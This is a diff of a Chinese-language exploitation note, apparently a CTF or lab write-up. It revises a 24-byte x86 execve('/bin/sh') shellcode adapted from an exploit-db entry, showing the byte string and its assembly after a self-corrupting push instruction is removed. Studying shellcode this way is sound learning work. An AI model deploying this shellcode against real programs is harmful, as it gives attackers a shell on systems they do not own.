@@ -221,10 +221,10 @@ shellcode = "\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6
                 int 80H
 ```
 在测试中发现，push操作破环了shellcode自己。
-使用https://www.exploit-db.com/exploits/37069/,删除冗余的两个字节，得到只有一个只有一个push操作的shellcode，长度为24（加上\x00为25）:
+使用https://www.exploit-db.com/exploits/37069/,删除冗余的3个字节，得到只有一个只有一个push操作的shellcode，长度为24:
 
 ```
-shellcode="\x31\xc9\xf7\xe1\xb0\x0b\xeb\x04\x5b\x51\xcd\x80\xe8\xf7\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
+shellcode="\x31\xc9\xf7\xe1\xb0\x0b\xeb\x03\x5b\xcd\x80\xe8\xf8\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00"
 ;================================================================================
      xor    ecx, ecx
      mul    ecx
@@ -232,9 +232,8 @@ shellcode="\x31\xc9\xf7\xe1\xb0\x0b\xeb\x04\x5b\x51\xcd\x80\xe8\xf7\xff\xff\xff\
      jmp    jjj
    ccc:
      pop    ebx
-     push   ecx
      int    0x80
    jjj:
      call   ccc
-     db  "/bin/sh"
+     db  '/bin/sh',0x0
 ```
